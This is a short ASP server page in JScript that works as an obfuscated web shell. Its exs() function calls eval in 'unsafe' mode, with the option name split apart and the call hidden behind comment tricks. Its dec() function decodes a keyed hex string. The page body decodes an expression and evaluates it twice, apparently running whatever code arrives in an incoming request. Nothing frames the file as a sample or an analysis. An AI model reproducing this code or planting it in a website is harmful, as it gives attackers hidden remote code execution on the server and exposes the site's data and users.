<script runat="server" language="JScript">
function exs(str) {
  var q = "u";
  var w = "afe";
  var a = q + "ns" + w;
  var b= /*///*/eval(str,a);
  return(b);
   }
function dec(str,key) {
  var k,q,t;
  var s="";
  var p="";
  for(k = 0; k < str.length; k=k+2)
  {
    t = ((k+2)/2) % key.length;
    p = key.substr(t, 1);
    if (isFinite(str.substr(k, 1)))
    {
      q = "0x"+ str.substr(k, 2);
      s = s + char(int(q)-p);// + "|" + p +"|";
    }
    else
    {
      q = "0x"+ str.substr(k, 4);
      s = s + char(int(q)-p);
      k = k+2;
    }
  }
  return(s);
   }
</script>
<%
exs(exs(dec("556675766874782F4C75696E5E237E2360","1314"))); 
%>
